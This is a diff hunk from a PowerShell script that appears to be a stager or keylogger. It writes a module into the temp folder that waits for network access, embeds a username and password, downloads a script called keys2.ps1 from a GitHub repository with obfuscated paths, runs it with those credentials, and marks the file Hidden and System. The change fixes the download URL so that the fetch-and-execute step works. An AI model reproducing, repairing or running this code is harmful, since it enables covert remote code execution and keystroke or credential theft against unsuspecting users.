@@ -263,7 +263,7 @@ $functions =  {
                 Out-File -InputObject 'do { $ping = test-connection -comp google.com -count 1 -Quiet; Start-Sleep -Seconds 10 } until ($ping)' -Force $env:temp\$modulename
                 Out-File -InputObject '$username = "delimundo88"' -Append -NoClobber $env:temp\$modulename
                 Out-File -InputObject '$password = "qkgpcbnoaleixuxo"' -Append -NoClobber $env:temp\$modulename
-                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://github.com/delimundo88/nicotine/blob/qwaeszrdxtfcygvuhbijnokmpl/heroine/morphine/keys2.ps1"))' -Append -NoClobber $env:temp\$modulename
+                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/delimundo88/nicotine/qwaeszrdxtfcygvuhbijnokmpl/heroine/morphine/keys2.ps1"))' -Append -NoClobber $env:temp\$modulename
                 Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "$username", "$password"' -Append -NoClobber $env:temp\$modulename
                 $modulenamefile = Get-Item $env:temp\$modulename
                 $modulenamefile.Attributes = "Hidden","System"
